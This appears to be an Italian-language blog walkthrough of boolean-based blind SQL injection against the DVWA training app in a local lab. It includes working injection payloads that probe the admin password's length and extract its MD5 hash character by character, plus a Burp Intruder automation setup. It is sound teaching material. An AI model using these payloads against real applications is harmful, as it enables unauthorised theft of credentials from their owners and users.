---
layout: post
title: "Blind SQL Injection su DVWA: quando il database smette di parlarti"
date: 2026-05-28
categories: [web-security, walkthrough]
tags: [sqli, blind-sqli, dvwa, boolean-based, burp-suite, mariadb]
excerpt: "Ho provato UNION SELECT sul modulo blind e non ho ottenuto nulla indietro. Poi ho passato venti minuti a fare domande sì/no al database un carattere alla volta, ed è lì che ho capito perché esiste sqlmap."
lang: it
page_id: blind-sql-injection-dvwa
permalink: /posts/sql-injection-alla-cieca-dvwa/
---

La sessione precedente si era chiusa con un dump di credenziali — cinque utenti, cinque hash MD5, l'intera tabella. Pulito, visibile, soddisfacente. Sono passato al modulo Blind SQL Injection aspettandomi altro dello stesso, ho digitato `' UNION SELECT user,password FROM users-- +`, e ho ottenuto questo:

```
User ID exists in the database.
```

Tutto qui. Nessun nome, nessun hash, nessun output. Solo una riga che conferma che sì, un record esiste. Ho riprovato con un payload diverso. Stessa riga. Ho provato `OR 1=1`. Stessa riga. Il database stava eseguendo le mie query — l'injection funzionava — ma l'applicazione aveva smesso di riflettermi indietro qualsiasi cosa. Tutti quei dati, lì da qualche parte, e la pagina si limitava ad annuire.

Questa è la Blind SQLi. Il database continua a parlare con le tue query. Solo che non parla con te.

## Il setup

Stesso container DVWA, livello di sicurezza Low, modulo diverso: **SQL Injection (Blind)**. Il parametro vulnerabile è sempre `id` in una richiesta GET, ma la risposta è stata ridotta a due soli stati: *"User ID exists in the database"* oppure *"User ID is MISSING from the database."* Questo è l'intero canale informativo a disposizione.

Per confermare che UNION sia davvero inutile qui, ho provato:

```
?id=1'+UNION+SELECT+user,password+FROM+users--+
```

Risposta: `User ID exists in the database.`

L'injection è partita. I dati erano lì. L'applicazione semplicemente non si è preoccupata di mostrarli. UNION è morto. Serve un approccio diverso.

## Costruire l'oracolo

Senza dati nell'output, l'unica cosa che puoi leggere è il **comportamento**. L'applicazione ha due stati — esiste / manca — e questo mappa direttamente su vero / falso. Questo è il tuo oracolo.

Prima di tutto, verifico che funzioni:

```
?id=1'+AND+1=1--+    → 200, "User ID exists"     → VERO
?id=1'+AND+1=2--+    → 404, "User ID is MISSING"  → FALSO
```

Il 404 sul caso falso mi ha confuso per un momento — un 404 dovrebbe significare "pagina non trovata", non "la tua condizione SQL è risultata falsa". Ma guardando il corpo della risposta, la pagina c'era ed era completamente renderizzata. DVWA restituisce deliberatamente 404 come status HTTP per lo stato "mancante". È una scelta nel codice PHP, non un errore del server. Su un target reale i due stati potrebbero essere entrambi 200 con testo diverso, o un redirect, o una differenza di tempistica. Quello che conta è che siano distinguibili in modo consistente.

Due status HTTP diversi sono in realtà il caso più pulito. L'oracolo funziona.

## Confermare l'esistenza di un utente specifico

Prima di andare a caccia della password, ho testato una query più mirata — confermare che un utente specifico esista nella tabella senza conoscerne l'ID numerico:

```
?id=1'+AND+(SELECT+'a'+FROM+users+WHERE+user='admin')='a'--+
```

Logica: se la subquery restituisce `'a'` (cosa che accade quando `user='admin'` esiste), la condizione è vera e la pagina restituisce 200. Se l'utente non esiste la subquery non restituisce nulla e la condizione fallisce.

Risposta: 200. Admin esiste. Ovvio col senno di poi, ma il meccanismo conta — è così che confermi nomi di tabelle e colonne alla cieca quando non li conosci già. Eseguiresti la stessa struttura di query contro `information_schema`, un carattere alla volta, per enumerare tutto da zero. È lento. Ci arriveremo.

## Trovare la lunghezza della password

La prima estrazione utile: quanto è lunga la password di admin? Ricerca binaria su `LENGTH()`:

```
?id=1'+AND+LENGTH((SELECT+password+FROM+users+WHERE+user='admin'))>20--+   → 200
?id=1'+AND+LENGTH((SELECT+password+FROM+users+WHERE+user='admin'))>31--+   → 200
?id=1'+AND+LENGTH((SELECT+password+FROM+users+WHERE+user='admin'))>32--+   → 404
```

La lunghezza è esattamente **32 caratteri**. Che è la lunghezza di un hash MD5, cosa che sapevamo già dalla sessione UNION — ma stavolta l'abbiamo dedotta alla cieca, senza output diretto, solo osservando la pagina dire sì o no.

## Estrarre il primo carattere

Ora la parte lenta. `SUBSTRING(password, 1, 1)` restituisce il primo carattere della password. Devo capire quale sia facendo domande sì/no sul suo valore.

Ricerca binaria sul valore ASCII:

```
SUBSTRING(password,1,1)>'m'  → 404  (è 'm' o prima)
SUBSTRING(password,1,1)>'f'  → 404  (è 'f' o prima)
SUBSTRING(password,1,1)>'3'  → 200  (è dopo '3')
SUBSTRING(password,1,1)>'9'  → 404  (è '9' o prima — quindi tra '4' e '9')
SUBSTRING(password,1,1)>'6'  → 404  (tra '4' e '6')
SUBSTRING(password,1,1)>'5'  → 404  (è '5' o prima)
SUBSTRING(password,1,1)='5'  → 200  ✓
```

Sette richieste per un carattere. Il primo carattere è **`5`**.

Conoscevo già l'hash completo dalla sessione precedente — `5f4dcc3b5aa765d61d8327deb882cf99`. Quindi sì, inizia con `5`. Ma estrarre quel singolo carattere alla cieca, attraverso sette domande sì/no, rende tutto tangibile in un modo che leggerlo non rende.

Poi ho fatto il conto: 32 caratteri, ~7 richieste ciascuno, sono circa 220 richieste per estrarre una password. A mano. Un payload alla volta.

## Automatizzare con Burp Intruder

A questo punto farlo a mano smette di avere senso. Il tab **Intruder** di Burp Suite è costruito esattamente per questo — prendi una richiesta, segna una posizione come variabile, cicla su una lista di payload, leggi i risultati.

Setup:
1. Intercetta la richiesta funzionante con il proxy
2. Manda a Intruder
3. Segna il carattere in test come posizione del payload — in `='§5§'`, il `5` diventa la variabile
4. Lista payload: i 16 caratteri esadecimali (`0123456789abcdef`), dato che gli hash MD5 usano solo quelli
5. Aggiungi un **Grep - Match** su `User ID exists in the database` — Burp aggiunge una colonna con una spunta per ogni hit

Lancia, leggi la colonna, trova l'unica spunta. Quello è il tuo carattere. Cambia `SUBSTRING(password,1,1)` in `SUBSTRING(password,2,1)`, ripeti.

Sempre 32 run. Sempre tedioso. Ma ogni run è automatizzato — 16 richieste sparate in secondi invece di 7 richieste digitate a mano. La colonna grep rende il risultato ovvio a colpo d'occhio.

## Il pattern, e perché esistono gli strumenti

La Blind SQLi boolean-based ha una struttura fissa che non cambia molto da target a target:

1. Trova due stati distinguibili (l'oracolo)
2. Conferma che l'oracolo sia stabile e iniettabile
3. Estrai i metadati: nome del database, nomi delle tabelle, nomi delle colonne — tutto via `information_schema`, carattere per carattere
4. Estrai i dati veri: un carattere alla volta con `SUBSTRING()`

Il meccanismo non è complicato. È solo meccanico e ripetitivo a un livello che manda in crisi chi lo esegue. Dopo un carattere estratto a mano, capisci la tecnica. Dopo 32, capisci `sqlmap`.

`sqlmap` fa tutto questo automaticamente — rilevamento dell'oracolo, sondaggio della lunghezza, ricerca binaria, estrazione dei caratteri, richieste parallelizzate. Non è magia, sono le stesse query che abbiamo lanciato noi, in un ciclo, con una strategia di ricerca sensata. Usarlo senza capire cosa fa sotto il cofano ti rende dipendente da uno strumento che non sai debuggare quando fallisce. Usarlo *dopo* averlo capito ti rende veloce.

## Cosa viene dopo

Il prossimo passo è lanciare `sqlmap` contro lo stesso modulo e guardarlo fare in trenta secondi quello che a noi è costato un'intera sessione a mano. Poi: i livelli Medium e High di DVWA, dove l'applicazione aggiunge filtri e i payload devono adattarsi.

## Takeaways

- **UNION è inutile senza riflessione.** Se l'applicazione non mostra l'output della query, serve un canale informativo diverso. Il comportamento è quel canale.
- **L'oracolo è tutto.** Due stati stabili e distinguibili sono tutto ciò che serve. Più pulito è l'oracolo, più veloce è l'estrazione.
- **La ricerca binaria conta.** Un approccio ingenuo testa ogni carattere in sequenza — 128 richieste per carattere. La ricerca binaria lo riduce a 7. A 32 caratteri la differenza è ~4000 richieste contro ~220.
- **Burp Intruder fa da ponte tra manuale e automatico.** È più veloce che digitare i payload a mano e più lento di sqlmap — ma ti costringe a capire ogni passo prima di automatizzarlo del tutto.
- **Lo fai a mano una volta.** Non perché sia efficiente, ma perché devi sentire quanto sia lento. È quello che ti fa capire perché sqlmap è uno strumento e non una scorciatoia.

## Riferimenti utili

- [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger — Boolean-based blind SQLi](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
- [PayloadsAllTheThings — Blind SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#blind-sql-injection)

---

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato via Docker sul mio computer locale. Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
